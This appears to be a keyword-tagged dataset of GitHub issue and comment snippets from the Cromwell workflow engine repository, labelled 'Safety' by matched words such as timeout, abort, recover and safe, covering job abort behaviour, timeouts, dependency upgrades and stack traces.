Safety,"It would be easier to consume errors if they were wrapped in JSON. I believe 400 errors are already represented this way already, but a 500 response timeout returns with Content-Type:`text/plain`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/947:149,timeout,timeout,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/947,1,['timeout'],['timeout']
Safety,"It would be helpful, for our production pipeline, if Cromwell's copying of workflow outputs and logs had an option to ""flatten"" the outputs by writing all to a single directory, instead of including the directory hierarchy when copying. We are careful to avoid file name collisions in our output and logs so handling that case wouldn't be an issue for us -- but might for other users.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641:255,avoid,avoid,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641,1,['avoid'],['avoid']
Safety,"It's hard to say what the impact is, right now it is likely an annoyance. - Effort: **Medium**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1413#issuecomment-325650373:98,Risk,Risk,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1413#issuecomment-325650373,1,['Risk'],['Risk']
Safety,It's not likely this will be worked on as the dev team has no experience with proxies nor one to test against. Can you have your corporate IT allowlist Docker? It seems like it would be a popular and non-risky request.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972:204,risk,risky,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972,1,['risk'],['risky']
Safety,"It's working as expected at least, Cromwell does not abort running jobs when a workflow fails. It just stops tracking them and fails the workflow without starting new jobs.; `ContinueWhilePossible` makes Cromwell continue to start new jobs ""while possible"" even if some jobs have failed.; In neither case does Cromwell abort running jobs when the workflow fails though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013:53,abort,abort,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013,2,['abort'],['abort']
Safety,"It’s still using the old 10-second timeout, so it seems like this build’s branch probably diverted from develop prior to the timeout commit landing. > On Aug 31, 2018, at 15:46, Thib <notifications@github.com> wrote:; > ; > Didn't @aednichols increase the timeout for that very recently ?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub, or mute the thread.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417777979:35,timeout,timeout,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417777979,3,['timeout'],['timeout']
Safety,"JDOM was removed in https://github.com/broadinstitute/cromwell/pull/6785 and this branch is updated from `develop`:. ```; root(aen_bw_1228)> | 81> whatDependsOn org.jdom jdom2; [ ... ]; [error] whatDependsOn org.jdom jdom2; [error] ^; ```. ( This is the normal output when `whatDependsOn` does not find something, see https://github.com/broadinstitute/cromwell/pull/6775 https://github.com/broadinstitute/cromwell/pull/6776 ). For Protobuf, the new MySQL pulls in a safe version ≥ 3.16.1:. ```; +-mysql:mysql-connector-java:8.0.29; | +-com.google.protobuf:protobuf-java:3.19.4; ```. which evicts older versions used by other dependencies. ```; +-io.opencensus:opencensus-proto:0.2.0; | +-com.google.protobuf:protobuf-java:3.19.4; | +-com.google.protobuf:protobuf-java:3.5.1 (evicted by: 3.19.4); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6793:466,safe,safe,466,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6793,1,['safe'],['safe']
Safety,JES Recover Closes #751,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1197:4,Recover,Recover,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1197,1,['Recover'],['Recover']
Safety,"JES abort claims success on successful abort request, not successful abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409,3,['abort'],['abort']
Safety,JES aborts seem to not (always?) abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976:4,abort,aborts,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976,2,['abort'],"['abort', 'aborts']"
Safety,"JES job recovery attempted despite ""abort-jobs-on-terminate"" enabled",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2050:8,recover,recovery,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2050,2,"['abort', 'recover']","['abort-jobs-on-terminate', 'recovery']"
Safety,JES/SFS/Spark initialization specs use same timeout as TES.; Sleep more on no_new_calls to help JES from restarting delayedTask2.; Sleep a bit on local before sync'ing to help avoid (reworded) NoSuchFileException's.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2975:44,timeout,timeout,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2975,2,"['avoid', 'timeout']","['avoid', 'timeout']"
Safety,"JIRA Ticket: https://broadworkbench.atlassian.net/browse/CROM-6867. Hi. . I've been running the GATK-SV pipeline with AWS backend and, sometimes, due to some intermittent errors the tasks are aborted half-way trough. Then Cromwell re-launches the task but some files, generated by the previous run, are already there what makes the pipeline to fail. With this in mind, I'm preparing do a change in cromwell that remove all the files (except for the script which gets created for each run/job) from the task folder before it starts and I would like to ask:; 1. if this makes sense?; 2. if there is any problem on doing this. can the same folder be used twice? or does each task has its own “workspace”? or Will this change impact any other downstream jobs as we will remove everything except “script” file?. Thanks in advance",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6651:192,abort,aborted,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6651,1,['abort'],['aborted']
Safety,Jackson-databind: vulnerable version 2.13.2 -> safe version 2.13.2.1+ (used 2.13.3); Nimbus JOSE+JWT: vulnerable version 9.9.3 => safe version 9.22 (used 9.23). ```; root(aen_bw_1227_2)> | 80> whatDependsOn com.fasterxml.jackson.core jackson-databind 2.13.2; [...]; [error] Expected '2.13.3'; [error] whatDependsOn com.fasterxml.jackson.core jackson-databind 2.13.2; [error] ^; ```; ```; root(aen_bw_1227_2)> | 80> whatDependsOn com.nimbusds nimbus-jose-jwt 9.9.3; [...]; [error] Expected '9.23'; [error] whatDependsOn com.nimbusds nimbus-jose-jwt 9.9.3; [error] ^; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6776:47,safe,safe,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6776,2,['safe'],['safe']
Safety,Jes flavored abort failure,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1405:13,abort,abort,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1405,1,['abort'],['abort']
Safety,JesInitializationActor will explode on abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1110:39,abort,abort,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1110,1,['abort'],['abort']
Safety,"Jira:; https://broadworkbench.atlassian.net/browse/BA-5756?atlOrigin=eyJpIjoiYjk0YjlhYzYyN2Y2NGRkY2FiMGIwNWFmZDk5M2ZiMWEiLCJwIjoiaiJ9. ```; version: cromwell41; backend: SGE; hard disk：Network shared storage （lustre）; ```. When the rc file has been generated, the task status is still running. This state will last a long time.; When we set ""exit-code-timeout-seconds = 18000"", such tasks will fail after 10 hours `(""message"": ""The job was aborted from outside Cromwell"") `. Despite the fact that the task has been completed normally. This situation does not always happen, and only a few tasks will encounter this problem.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5051:352,timeout,timeout-seconds,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5051,2,"['abort', 'timeout']","['aborted', 'timeout-seconds']"
Safety,Job preparation safety for engine functions [BW-478],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6161:16,safe,safety,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6161,1,['safe'],['safety']
Safety,Jobs that SIGTERM themselves are assumed to have been aborted,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3896:54,abort,aborted,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3896,1,['abort'],['aborted']
Safety,JoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecuti,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:7941,recover,recover,7941,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,"Just as a safety measure, maybe we should consider add a config option called something like ""allowCrossFSLocalisation"" - just to avoid accidentally downloading a 500GB file from GCS and the costs involved?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494:10,safe,safety,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494,2,"['avoid', 'safe']","['avoid', 'safety']"
Safety,"Just to clarify, I think the motivation here was to make sure the workflow that went terminal does not get recovered and a job that already ran once gets re-run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-304958771:107,recover,recovered,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-304958771,1,['recover'],['recovered']
Safety,"KE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. hashing-strategy: ""path"". check-sibling-md5: false; }; }; }. default-runtime-attributes {; failOnStderr: false; continueOnReturnCode: 0; }; }; }; }; }. services {; MetadataService {; }. Instrumentation {; }; HealthMonitor {; config {; }; }; LoadController {; config {; }; }; }. database {; driver = ""slick.jdbc.MySQLProfile$"". db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://database.host/callcachingdatabase?rewriteBatchedStatements=true""; user =",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:3270,timeout,timeout-seconds,3270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,1,['timeout'],['timeout-seconds']
Safety,"LBjtl7_8otWYjTQgx_mw9zYqD3Byb2R1Y3Rpb25RdWV1ZQ; > ; > broad-wgs-prod5, 2018-01-16T15:37:16Z, 2018-01-16T17:45:43Z, ggp-1801918915849415035, us-central1-c/n1-standard-16; > broad-wgs-prod5, 2018-01-16T15:37:16Z, 2018-01-16T15:46:25Z, ggp-1347601243842424591, us-east1-c/n1-standard-16; > broad-wgs-prod5, 2018-01-16T15:37:16Z, 2018-01-16T17:14:27Z, ggp-17952768368412969986, us-east1-c/n1-standard-16; > broad-wgs-prod5, 2018-01-16T20:41:42Z, 2018-01-16T22:28:14Z, ggp-17459223747282221022, us-central1-b/n1-standard-2; > broad-wgs-prod5, 2018-01-16T22:37:32Z, 2018-01-16T23:38:28Z, ggp-1817239588482439788, us-east1-c/n1-standard-2; > broad-wgs-prod5, 2018-01-16T23:46:08Z, 2018-01-17T14:57:19Z, ggp-3754421722448645101, us-east1-d/n1-standard-2. > ------------------------------- ; > ferrara@broadinstitute.org <ferrara@broadinstitute.org> #11 Jan 17, 2018 12:32PM ; > Mike, ; > ; > For comparison - the previous reported workflow also had a Message 14: type pre-emption. Which is what cromwell normally detects as pre-emption. Not sure what is difference between the above pre-emptions and the one below. Info as follows:; > ; > OPSID; > operations/ENOi-PyPLBioyJKO-s3GhY0BIMf5sPc2Kg9wcm9kdWN0aW9uUXVldWU; > ; > broad-wgs-prod5, 2018-01-16T15:37:17Z, 2018-01-16T16:43:22Z, ggp-10163246050849367080, us-east1-d/n1-standard-16. > ------------------------------- ; > gdk@google.com <gdk@google.com> Jan 17, 2018 01:36PM; > Accepted by gdk@google.com. > ------------------------------- ; > gdk@google.com <gdk@google.com> #12 Jan 17, 2018 02:52PM ; > The difference between 13 and 14 here is simply when PAPI notices that the VM has been shut down. They mean essentially the same thing, and cromwell should be able to retry with the same logic.; > ; > It looks like this might have been exacerbated because changed the shutdown behavior of VMs so that they won't stay around for 24h for debugging before the holidays. This means that when a VM is preempted it shuts down faster than it used to, and so ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3157:9057,detect,detects,9057,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3157,1,['detect'],['detects']
Safety,Lazy centaur checkDescription timeout handling [NOJIRA],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5424:30,timeout,timeout,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5424,1,['timeout'],['timeout']
Safety,"Lenthall and wdl4s have been folded into the main Cromwell repo so the Lenthall and wdl4s repos should be deprecated. Add a message to the Readme, make it impossible for users to make new issues/PR's, etc. As a **user looking at the wdl4s or Lenthall repos**, I want **it to be obvious that they are deprecated, and to have useful information about where to find the artifacts within Cromwell**, so that **I am not tempted to develop against the deprecated repos**. - Effort: Small; - Risk: Small to Medium; - We'll have to keep an eye on the repos for a little while to make sure all interested parties got the message; - Business value: Small to Medium; - Having clear communication to users is important!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2733:485,Risk,Risk,485,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2733,1,['Risk'],['Risk']
Safety,"Let's talk after standup. I think we're going to need it - IIRC there's already something incorrectly reading/writing from metadata, and recovery was the use case which informed it in the first place & that's incoming",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1031#issuecomment-227760284:137,recover,recovery,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1031#issuecomment-227760284,1,['recover'],['recovery']
Safety,LocalInitializationActor will explode on abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1111:41,abort,abort,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1111,1,['abort'],['abort']
Safety,"Log from broad-dsde-dev here: https://gist.githubusercontent.com/scottfrazer/a0838aa2180e7972da84c4730975b9f5/raw/d0cebdd317489298d6553e5602bfd4b775ab9ea3/gistfile1.txt. Most specifically:. ```; WorkflowActor [UUID(0790bc7e)]: Beginning transition from Running to Aborting.; WorkflowActor [UUID(0790bc7e)]: transitioning from Running to Aborting.; JES Run [UUID(0790bc7e):hello]: Status change from Running to Success; ERROR - 400 Bad Request; {; ""code"" : 400,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Precondition check failed."",; ""reason"" : ""failedPrecondition""; } ],; ""message"" : ""Precondition check failed."",; ""status"" : ""FAILED_PRECONDITION""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request; {; ""code"" : 400,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Precondition check failed."",; ""reason"" : ""failedPrecondition""; } ],; ""message"" : ""Precondition check failed."",; ""status"" : ""FAILED_PRECONDITION""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/700:264,Abort,Aborting,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/700,2,['Abort'],['Aborting']
Safety,Logically revert #4263 since multi-Cromwell deployments no longer need a specific abort server. A simple git revert has a ton of conflicts but hopefully this shouldn't be too tough.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4596:82,abort,abort,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4596,1,['abort'],['abort']
Safety,"Logs captured from alpha environment:; ```; November 2nd 2018, 20:16:15.000 | 2018-11-03 00:16:15 [cromwell-system-akka.actor.default-dispatcher-57321] ERROR c.e.w.w.WorkflowStoreSubmitActor - Workflow com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction submit failed.; -- | --.   | November 2nd 2018, 20:16:15.000 | 2018-11-03 00:16:15 [cromwell-system-akka.actor.default-dispatcher-57321] ERROR c.e.w.w.WorkflowStoreSubmitActor - Workflow com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction submit failed.   | November 2nd 2018, 10:16:21.000 | 2018-11-02 14:16:21 [cromwell-system-akka.actor.default-dispatcher-42970] ERROR c.e.w.w.WorkflowStoreEngineActor - Error trying to fetch new workflows; com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure. The last packet successfully received from the server was 1 milliseconds ago. The last packet sent successfully to the server was 1 milliseconds ago.; 	at sun.reflect.GeneratedConstructorAccessor75.newInstance(Unknown Source); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:423); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:990); 	at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3562); 	at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3462); 	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3905); 	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2530); 	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2683); 	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2491); 	at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:4807); 	at com.zaxxer.hikari.pool.ProxyConnection.setAutoCommit(ProxyConnection.java:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4360:279,timeout,timeout,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4360,2,['timeout'],['timeout']
Safety,Longer timeout and more actor names for MetadataBuilderActorSpec BT-53,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6093:7,timeout,timeout,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6093,1,['timeout'],['timeout']
Safety,"Looking closer at the specific problem @abaumann reported, it appears to just be workflow level mismatches and aborting - I'll fix just those first and we'll see if the problems are deeper than that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/940#issuecomment-224394911:111,abort,aborting,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/940#issuecomment-224394911,1,['abort'],['aborting']
Safety,Looking forward to this feature. When enabled the `check-alive` command call via `exit-code-timeout-seconds` currently polls on average once every 10 seconds per running job (under minimum load).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949:92,timeout,timeout-seconds,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949,1,['timeout'],['timeout-seconds']
Safety,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:586,detect,detected,586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['detect'],['detected']
Safety,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:94,avoid,avoid,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981,1,['avoid'],['avoid']
Safety,"Looks like it issues a SIGTERM by default: https://www.ctl.io/developers/blog/post/gracefully-stopping-docker-containers/. However the timeout for docker will be shorter than cromwell's, so we should still document how to change *that* (`docker stop ----time=30 foo`) and thus I'm not closing this like I just said I would.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2562#issuecomment-323794220:135,timeout,timeout,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2562#issuecomment-323794220,1,['timeout'],['timeout']
Safety,Looks like this PR didn't catch the test timeout increases for some reason 🤔,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570559229:41,timeout,timeout,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570559229,1,['timeout'],['timeout']
Safety,Looks like we now have `504 Gateway Timeout` errors too! Should we perhaps add a new case for that?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5321#issuecomment-572676517:36,Timeout,Timeout,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5321#issuecomment-572676517,1,['Timeout'],['Timeout']
Safety,"Made redundant by a recent change to the test expectations. Closing this ""now just whitespace"" PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692:5,redund,redundant,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692,1,['redund'],['redundant']
Safety,Make PAPIv2 batch request timeouts configurable,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4973:26,timeout,timeouts,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4973,1,['timeout'],['timeouts']
Safety,Make find ' ' in filename safe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3864:26,safe,safe,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3864,1,['safe'],['safe']
Safety,"Makes use of the helper traits created in the I/O actor PR to abstract managing of backpressure messages etc.. . Creates a `DockerClientHelper` trait to isolate the timeout management logic (if the docker actor never responds, ensures that we don't hang forever). The changes in `HttpFlowWithRetry` add exponential backoff retries (previously they were simple immediate retries) to HTTP responses, and list explicitly the HTTP codes that are retryable.; More specifically, Http ""failures"", as in ""the http request itself failed"", are not retried, since akka already does that by default under the hood. Only Http responses with a retryable error code are retried asynchronously, following the same model as the I/O actor.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2077:165,timeout,timeout,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2077,1,['timeout'],['timeout']
Safety,Malformed UUID causes Call Cache Diff to timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2453:41,timeout,timeout,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2453,1,['timeout'],['timeout']
Safety,Map literal declarations don't detect upstream dependencies,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1951:31,detect,detect,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1951,1,['detect'],['detect']
Safety,Maybe you should use Long as internal cromwell wdl-Int representation to avoid such type of bugs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2744#issuecomment-336553801:73,avoid,avoid,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2744#issuecomment-336553801,1,['avoid'],['avoid']
Safety,Metadata entry count safety limit should apply to matched rows only [52-hotfix],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5725:21,safe,safety,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5725,1,['safe'],['safety']
